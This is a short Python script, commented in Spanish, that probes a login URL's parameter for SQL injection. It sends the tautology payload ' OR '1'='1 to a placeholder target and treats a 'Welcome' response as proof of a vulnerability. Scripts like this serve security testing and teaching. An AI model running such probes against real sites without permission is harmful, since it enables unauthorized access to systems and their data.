import requests

# Función para probar la vulnerabilidad de inyección SQL en un URL
def sql_injection_test(url, param):
    injection_payload = "' OR '1'='1"
    vulnerable_url = f"{url}?{param}={injection_payload}"
    try:
        response = requests.get(vulnerable_url)
        if "Welcome" in response.text:
            print(f"Vulnerable a SQL Injection: {vulnerable_url}")
        else:
            print(f"No vulnerable a SQL Injection: {vulnerable_url}")
    except Exception as e:
        print(f"Error al probar {vulnerable_url}: {e}")

if __name__ == "__main__":
    # URL y parámetro objetivo
    target_url = "http://example.com/login"
    target_param = "username"
    sql_injection_test(target_url, target_param)
